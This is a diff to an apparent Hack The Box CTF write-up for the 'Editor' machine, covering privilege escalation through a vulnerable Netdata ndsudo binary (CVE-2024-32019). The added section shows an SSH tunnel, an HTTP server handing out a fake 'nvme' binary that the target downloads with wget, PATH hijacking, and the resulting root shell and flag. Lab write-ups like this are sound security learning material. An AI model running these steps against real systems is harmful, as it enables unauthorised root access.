@@ -111,14 +111,54 @@ oliver@editor:~$ cat user.txt
 
 ## Privilege Escalation via Netdata
 
-Port 19999 was running **Netdata**. After tunneling SSH and accessing
-the web UI, it was identified as vulnerable to CVE-2024-32019.
+Running `sudo -l` showed that Oliver does not have permission to run any command as root 
 
-Exploit using fake `nvme` binary:
+After inspecting local ports, I noticed that port `19999` is used by **Netdata**, a monitoring tool. I created an SSH tunnel:
 
 ``` bash
-wget http://10.10.15.14:5000/nvme
-chmod +x nvme
+ssh -L 19999:127.0.0.1:19999 oliver@10.10.11.80
 ```
+The fist thing i saw after enter to the web was
 
+The
+ moment I opened the Netdata web page, a big warning showed up saying 
+the version was outdated — a great hint that it might be vulnerable.
+
+https://github.com/netdata/netdata/security/advisories/GHSA-pmhq-4cxq-wj93?source=post_page-----2128149b1929---------------------------------------
+
+This vulnerability affects the `ndsudo` binary that ships with Netdata. It allows a **Local Privilege Escalation (LPE)** by exploiting an insecure `PATH` environment variable.
+
+We can create a fake `nvme` binary, which gets executed instead of the real one when `ndsudo` tries to call `nvme-list`.
+
+This operation is clearly demonstrated in the PoC by [AliElKhatteb](https://github.com/AliElKhatteb):
 ------------------------------------------------------------------------
+```
+󰣇 ~/Documentos/editorhtb ❯ python3 -m http.server 5000
+Serving HTTP on 0.0.0.0 port 5000 (http://0.0.0.0:5000/) ...
+10.10.11.80 - - [10/Aug/2025 21:04:14] "GET /nvme HTTP/1.1" 200 -
+```
+```
+oliver@editor:~$ wget http://10.10.15.14:5000/nvme
+--2025-08-11 00:03:42--  http://10.10.15.14:5000/nvme
+Connecting to 10.10.15.14:5000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 782800 (764K) [application/octet-stream]
+Saving to: ‘nvme’
+
+nvme                             100%[=========================================================>] 764.45K   394KB/s    in 1.9s    
+
+2025-08-11 00:03:45 (394 KB/s) - ‘nvme’ saved [782800/782800]
+```
+```
+oliver@editor:~$ chmod +x /tmp/nvme
+oliver@editor:~$ export PATH=/tmp:$PATH
+oliver@editor:~$ /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
+
+root@editor:/home/oliver# id
+uid=0(root) gid=0(root) groups=0(root),999(netdata),1000(oliver)
+
+root@editor:/home/oliver# cat /root/root.txt
+99b89e8afa5...
+root@editor:/home/oliver#
+
+```
